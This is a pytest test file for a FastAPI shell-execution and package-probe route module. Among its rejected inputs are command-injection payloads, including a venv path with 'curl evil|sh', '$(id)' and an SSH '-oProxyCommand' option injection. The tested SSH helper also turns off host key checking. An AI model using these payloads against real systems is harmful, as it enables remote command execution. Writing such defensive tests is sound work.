"""Tests for shell_routes.py helpers."""

import builtins
import asyncio
import importlib.util
import json
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi.routing import APIRoute

from routes.shell_routes import (
    _find_line_break,
    _running_in_container,
    _docker_row_status,
    _package_installed_from_probe,
    _package_status_note,
    _reject_cross_site,
    _ssh_base_argv,
    _venv_activate_prefix,
    DOCKER_IN_CONTAINER_HINT,
)


def _endpoint(router, path, method):
    method = method.upper()
    for route in router.routes:
        if isinstance(route, APIRoute) and route.path == path and method in route.methods:
            return route.endpoint
    raise AssertionError(f"route not found: {method} {path}")


class RequestLike(SimpleNamespace):
    def __init__(self, *, body=None, headers=None, user=None, auth_manager=None):
        super().__init__(
            headers=headers or {},
            state=SimpleNamespace(current_user=user),
            app=SimpleNamespace(state=SimpleNamespace(auth_manager=auth_manager)),
        )
        self._body = body or {}

    async def json(self):
        return self._body


def test_shell_routes_import_without_posix_pty_modules(monkeypatch):
    """Native Windows has no fcntl/termios; importing routes must still work."""
    real_import = builtins.__import__

    def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
        if name in {"fcntl", "pty"}:
            raise ImportError(f"No module named {name!r}")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    cached_modules = {name: sys.modules.pop(name, None) for name in ("fcntl", "pty")}

    module_path = Path(__file__).resolve().parents[1] / "routes" / "shell_routes.py"
    spec = importlib.util.spec_from_file_location("_shell_routes_without_pty", module_path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    try:
        spec.loader.exec_module(module)
    finally:
        sys.modules.pop(spec.name, None)
        for name, cached_module in cached_modules.items():
            if cached_module is not None:
                sys.modules[name] = cached_module

    assert module.PTY_SUPPORTED is False
    assert module._find_line_break(b"ok\n") == (2, 1)


async def test_generate_pty_reports_explicit_unsupported_error(monkeypatch):
    """Clients can distinguish unsupported PTY mode from process failures."""
    import routes.shell_routes as shell_routes

    monkeypatch.setattr(shell_routes, "PTY_SUPPORTED", False)
    monkeypatch.setattr(shell_routes, "_PTY_IMPORT_ERROR", ImportError("No module named 'termios'"))

    request = SimpleNamespace(is_disconnected=lambda: False)
    events = [
        json.loads(chunk.removeprefix("data: ").strip())
        async for chunk in shell_routes._generate_pty("echo hi", 5, request)
    ]

    assert events == [
        {
            "stream": "stderr",
            "data": "PTY streaming is not supported on this platform: No module named 'termios'",
            "error": shell_routes.PTY_UNSUPPORTED_ERROR,
        },
        {"exit_code": -1, "error": shell_routes.PTY_UNSUPPORTED_ERROR},
    ]


class TestFindLineBreak:
    """Test line-break detection in byte buffers."""

    def test_newline(self):
        assert _find_line_break(b"hello\nworld") == (5, 1)

    def test_crlf(self):
        assert _find_line_break(b"hello\r\nworld") == (5, 2)

    def test_cr_only(self):
        assert _find_line_break(b"hello\rworld") == (5, 1)

    def test_no_breaks(self):
        assert _find_line_break(b"no breaks") == (-1, 0)

    def test_empty(self):
        assert _find_line_break(b"") == (-1, 0)

    def test_leading_newline(self):
        assert _find_line_break(b"\n") == (0, 1)

    def test_leading_cr(self):
        assert _find_line_break(b"\r") == (0, 1)

    def test_leading_crlf(self):
        assert _find_line_break(b"\r\n") == (0, 2)

    def test_multiple_newlines(self):
        """Should find the first one."""
        assert _find_line_break(b"a\nb\nc") == (1, 1)

    def test_cr_before_newline_not_adjacent(self):
        """\\r at pos 2, \\n at pos 5 — not CRLF, should return \\r pos."""
        assert _find_line_break(b"ab\rcd\n") == (2, 1)

    def test_newline_before_cr(self):
        """\\n comes before \\r — should return \\n."""
        assert _find_line_break(b"ab\ncd\r") == (2, 1)


class TestRunningInContainer:
    """Detect whether the Cleverly process itself runs inside a container."""

    def test_dockerenv_marker_present(self, tmp_path):
        marker = tmp_path / ".dockerenv"
        marker.write_text("")
        assert _running_in_container(
            dockerenv_path=str(marker), cgroup_path=str(tmp_path / "missing"),
        ) is True

    def test_cgroup_names_a_container_runtime(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("12:devices:/docker/abcdef0123456789\n")
        assert _running_in_container(
            dockerenv_path=str(tmp_path / "no-marker"), cgroup_path=str(cgroup),
        ) is True

    def test_bare_host_has_neither_signal(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("0::/user.slice/session-1.scope\n")
        assert _running_in_container(
            dockerenv_path=str(tmp_path / "no-marker"), cgroup_path=str(cgroup),
        ) is False

    def test_missing_cgroup_file_is_not_a_container(self, tmp_path):
        assert _running_in_container(
            dockerenv_path=str(tmp_path / "no-marker"),
            cgroup_path=str(tmp_path / "also-missing"),
        ) is False


class TestDockerRowStatus:
    """Applicability plus install hint for the docker dependency row."""

    DEFAULT = "Install Docker on the selected server."

    def test_in_container_and_absent_is_not_applicable_with_safe_default_hint(self):
        status = _docker_row_status(
            on_remote=False, in_container=True, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is False
        assert status.install_hint == DOCKER_IN_CONTAINER_HINT

    def test_in_container_but_present_is_applicable_with_default_hint(self):
        status = _docker_row_status(
            on_remote=False, in_container=True, installed=True, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_on_host_and_absent_stays_applicable_with_default_hint(self):
        status = _docker_row_status(
            on_remote=False, in_container=False, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_is_always_applicable_even_when_absent(self):
        status = _docker_row_status(
            on_remote=True, in_container=False, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_ignores_local_container_status(self):
        status = _docker_row_status(
            on_remote=True, in_container=True, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_container_hint_steers_to_remote_and_warns_on_socket(self):
        lowered = DOCKER_IN_CONTAINER_HINT.lower()
        assert "remote" in lowered
        assert "socket" in lowered
        assert "host-root" in lowered or "host root" in lowered


class TestPackageProbeStatus:
    """Dependency rows should reflect serve readiness, not import coincidences."""

    def test_vllm_namespace_without_cli_is_not_installed(self):
        probe = {
            "modules": {
                "vllm": {
                    "found": True,
                    "origin": None,
                    "loader": None,
                    "locations": ["/root/vllm"],
                    "real_module": False,
                }
            },
            "dists": {},
            "binaries": {"vllm": None},
        }

        assert _package_installed_from_probe("vllm", probe) is False
        assert "namespace" in _package_status_note("vllm", probe)
        assert "no vLLM CLI" in _package_status_note("vllm", probe)

    def test_vllm_requires_cli_for_current_serve_command(self):
        probe = {
            "modules": {"vllm": {"found": True, "real_module": True}},
            "dists": {"vllm": "0.8.5"},
            "binaries": {"vllm": "/home/user/venv/bin/vllm"},
        }

        assert _package_installed_from_probe("vllm", probe) is True

    def test_llama_cpp_is_installed_when_native_llama_server_exists(self):
        probe = {
            "modules": {"llama_cpp": {"found": False, "real_module": False}},
            "dists": {},
            "binaries": {"llama-server": "/usr/local/bin/llama-server"},
        }

        assert _package_installed_from_probe("llama_cpp", probe) is True
        assert "native llama-server" in _package_status_note("llama_cpp", probe)

    def test_diffusers_requires_torch_too(self):
        missing_torch = {
            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": False}},
            "dists": {"diffusers": "0.37.0"},
            "binaries": {},
        }
        ready = {
            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": True, "real_module": True}},
            "dists": {"diffusers": "0.37.0", "torch": "2.10.0"},
            "binaries": {},
        }

        assert _package_installed_from_probe("diffusers", missing_torch) is False
        assert _package_installed_from_probe("diffusers", ready) is True


class TestSshBaseArgv:
    def test_basic_host_no_port(self):
        assert _ssh_base_argv("user@example.com", None) == [
            "ssh", "-o", "ConnectTimeout=6", "-o", "StrictHostKeyChecking=no",
            "user@example.com",
        ]

    def test_default_port_22_omitted(self):
        assert "-p" not in _ssh_base_argv("h", "22")
        assert "-p" not in _ssh_base_argv("h", "")
        assert "-p" not in _ssh_base_argv("h", None)

    def test_custom_port_added_as_separate_argv(self):
        assert _ssh_base_argv("h", "2222")[-3:] == ["-p", "2222", "h"]

    @pytest.mark.parametrize("bad", ["0", "70000", "-1", "8a", "$(id)", "22 22"])
    def test_bad_port_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv("h", bad)

    def test_option_injecting_host_rejected(self):
        with pytest.raises(ValueError):
            _ssh_base_argv("-oProxyCommand=touch /tmp/pwn", None)

    @pytest.mark.parametrize("bad", ["", "   ", None])
    def test_empty_host_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv(bad, None)


class TestVenvActivatePrefix:
    def test_empty_returns_blank(self):
        assert _venv_activate_prefix(None) == ""
        assert _venv_activate_prefix("") == ""

    def test_appends_bin_activate(self):
        assert _venv_activate_prefix("~/venv") == ". ~/venv/bin/activate && "

    def test_already_pointing_at_activate(self):
        assert _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "

    @pytest.mark.parametrize("bad", [
        "/opt/v && curl evil|sh",
        "$(id)",
        "`id`",
        "v;id",
        "v\nid",
        "v|id",
    ])
    def test_injection_payloads_rejected(self, bad):
        with pytest.raises(ValueError):
            _venv_activate_prefix(bad)


class TestRejectCrossSite:
    @staticmethod
    def _req(headers):
        return SimpleNamespace(headers=headers)

    def test_cross_site_rejected(self):
        from fastapi import HTTPException
        with pytest.raises(HTTPException) as exc:
            _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
        assert exc.value.status_code == 403

    @pytest.mark.parametrize("site", ["same-origin", "same-site", "none"])
    def test_same_origin_and_direct_nav_allowed(self, site):
        assert _reject_cross_site(self._req({"sec-fetch-site": site})) is None

    def test_missing_header_allowed(self):
        assert _reject_cross_site(self._req({})) is None


def test_require_admin_branches():
    import routes.shell_routes as shell_routes
    from fastapi import HTTPException

    shell_routes._require_admin(RequestLike(auth_manager=None))
    shell_routes._require_admin(RequestLike(auth_manager=SimpleNamespace(is_admin=lambda user: False), user="internal-tool"))

    with pytest.raises(HTTPException) as exc:
        shell_routes._require_admin(RequestLike(auth_manager=SimpleNamespace(is_admin=lambda user: True), user="api"))
    assert exc.value.status_code == 403

    with pytest.raises(HTTPException) as exc:
        shell_routes._require_admin(RequestLike(auth_manager=SimpleNamespace(is_admin=lambda user: False), user="bob"))
    assert exc.value.status_code == 403

    shell_routes._require_admin(RequestLike(auth_manager=SimpleNamespace(is_admin=lambda user: user == "alice"), user="alice"))


async def test_exec_shell_success_timeout_and_spawn_error(monkeypatch):
    import routes.shell_routes as shell_routes

    class Proc:
        returncode = 7
        killed = False

        async def communicate(self):
            return b"out" * 100000, b"err"

        def kill(self):
            self.killed = True

        async def wait(self):
            return None

    proc = Proc()
    monkeypatch.setattr(shell_routes, "_create_shell", lambda *args, **kwargs: asyncio.sleep(0, result=proc))
    result = await shell_routes._exec_shell("echo hi", timeout=5)
    assert result["stdout"].startswith("out")
    assert len(result["stdout"]) == shell_routes.MAX_OUTPUT
    assert result["stderr"] == "err"
    assert result["exit_code"] == 7

    async def raise_timeout(awaitable, timeout=None):
        awaitable.close()
        raise asyncio.TimeoutError()

    monkeypatch.setattr(shell_routes.asyncio, "wait_for", raise_timeout)
    timed = await shell_routes._exec_shell("sleep", timeout=1)
    assert timed == {"stdout": "", "stderr": "Command timed out after 1s", "exit_code": -1}
    assert proc.killed is True

    async def fail_create(*args, **kwargs):
        raise RuntimeError("spawn failed")

    monkeypatch.setattr(shell_routes, "_create_shell", fail_create)
    errored = await shell_routes._exec_shell("bad", timeout=1)
    assert errored == {"stdout": "", "stderr": "spawn failed", "exit_code": -1}


async def test_shell_exec_route_and_package_install(monkeypatch):
    import routes.shell_routes as shell_routes

    monkeypatch.setattr(shell_routes, "_require_admin", lambda request: None)
    router = shell_routes.setup_shell_routes()

    shell_exec = _endpoint(router, "/api/shell/exec", "POST")
    install = _endpoint(router, "/api/cookbook/packages/install", "POST")

    assert await shell_exec(RequestLike(), shell_routes.ShellExecRequest(command="   ")) == {
        "stdout": "",
        "stderr": "No command provided",
        "exit_code": 1,
    }
    monkeypatch.setattr(shell_routes, "_exec_shell", lambda command, timeout: asyncio.sleep(0, result={"stdout": command, "stderr": "", "exit_code": 0}))
    assert (await shell_exec(RequestLike(), shell_routes.ShellExecRequest(command=" echo hi ")))["stdout"] == "echo hi"

    monkeypatch.setattr(shell_routes, "offline_mode", lambda: True)
    with pytest.raises(Exception) as shell_offline_exc:
        await shell_exec(RequestLike(), shell_routes.ShellExecRequest(command="curl https://example.com"))
    assert getattr(shell_offline_exc.value, "status_code", None) == 403
    assert getattr(shell_offline_exc.value, "detail", "") == "Network shell commands are disabled in offline mode"

    with pytest.raises(Exception) as exc:
        await install(RequestLike(body={"pip": "playwright"}))
    assert getattr(exc.value, "status_code", None) == 403

    monkeypatch.setattr(shell_routes, "offline_mode", lambda: False)
    assert await install(RequestLike(body={})) == {"ok": False, "error": "No package specified"}
    assert await install(RequestLike(body={"pip": "evil"})) == {"ok": False, "error": "Unknown package: evil"}

    class Proc:
        def __init__(self, code):
            self.returncode = code

        async def communicate(self):
            return b"installed ok", b"install failed"

    created = []

    async def create_exec(*args, **kwargs):
        created.append(args)
        return Proc(0)

    monkeypatch.setattr(shell_routes.asyncio, "create_subprocess_exec", create_exec)
    assert await install(RequestLike(body={"pip": "playwright"})) == {"ok": True, "output": "installed ok"}
    assert created[-1][-1] == "playwright"

    async def create_failed(*args, **kwargs):
        return Proc(1)

    monkeypatch.setattr(shell_routes.asyncio, "create_subprocess_exec", create_failed)
    assert await install(RequestLike(body={"pip": "playwright"})) == {"ok": False, "error": "install failed"}


async def test_list_packages_local_and_remote(monkeypatch):
    import importlib
    import importlib.metadata as importlib_metadata
    import routes.shell_routes as shell_routes

    monkeypatch.setattr(shell_routes, "_require_admin", lambda request: None)
    monkeypatch.setattr(shell_routes, "_reject_cross_site", lambda request: None)
    monkeypatch.setattr(shell_routes, "offline_mode", lambda: False)
    monkeypatch.setattr(shell_routes, "_running_in_container", lambda: True)
    monkeypatch.setattr(shell_routes.shutil, "which", lambda name: "/bin/llama-server" if name == "llama-server" else None)

    def fake_import_module(name):
        if name in {"playwright", "realesrgan"}:
            return SimpleNamespace()
        raise ImportError(name)

    def fake_version(name):
        if name in {"playwright", "realesrgan"}:
            return "1.0"
        raise importlib_metadata.PackageNotFoundError(name)

    monkeypatch.setattr(importlib, "import_module", fake_import_module)
    monkeypatch.setattr(importlib_metadata, "version", fake_version)

    router = shell_routes.setup_shell_routes()
    list_packages = _endpoint(router, "/api/cookbook/packages", "GET")
    local = await list_packages(RequestLike(), host=None, ssh_port=None, venv=None)
    by_name = {p["name"]: p for p in local["packages"]}
    assert by_name["docker"]["applicable"] is False
    assert by_name["docker"]["install_hint"] == shell_routes.DOCKER_IN_CONTAINER_HINT
    assert by_name["llama_cpp"]["installed"] is True
    assert by_name["playwright"]["installed"] is True

    monkeypatch.setattr(shell_routes, "offline_mode", lambda: True)
    with pytest.raises(Exception) as offline_exc:
        await list_packages(RequestLike(), host="gpu.local", ssh_port="2222", venv="~/venv")
    assert getattr(offline_exc.value, "status_code", None) == 403
    assert getattr(offline_exc.value, "detail", "") == "Remote package probes are disabled in offline mode"
    monkeypatch.setattr(shell_routes, "offline_mode", lambda: False)

    class Proc:
        def __init__(self, out):
            self._out = out

        async def communicate(self):
            return self._out, b""

    calls = []

    async def create_exec(*args, **kwargs):
        calls.append(args)
        if "python3 -c" in args[-1]:
            payload = {
                "vllm": {"modules": {"vllm": {"found": True, "real_module": True}}, "dists": {"vllm": "1"}, "binaries": {"vllm": "/venv/bin/vllm"}},
                "diffusers": {"modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": True, "real_module": True}}, "dists": {"diffusers": "1", "torch": "2"}, "binaries": {}},
            }
            return Proc(("noise\n" + json.dumps(payload)).encode())
        return Proc(b"tmux=1\ndocker=0\n")

    monkeypatch.setattr(shell_routes.asyncio, "create_subprocess_exec", create_exec)
    remote = await list_packages(RequestLike(), host="gpu.local", ssh_port="2222", venv="~/venv")
    remote_by_name = {p["name"]: p for p in remote["packages"]}
    assert remote_by_name["tmux"]["installed"] is True
    assert remote_by_name["docker"]["installed"] is False
    assert remote_by_name["vllm"]["installed"] is True
    assert "vLLM CLI" in remote_by_name["vllm"]["status_note"]
    assert calls[0][0] == "ssh"

    with pytest.raises(Exception) as exc:
        await list_packages(RequestLike(), host="gpu.local", ssh_port="bad", venv=None)
    assert getattr(exc.value, "status_code", None) == 400
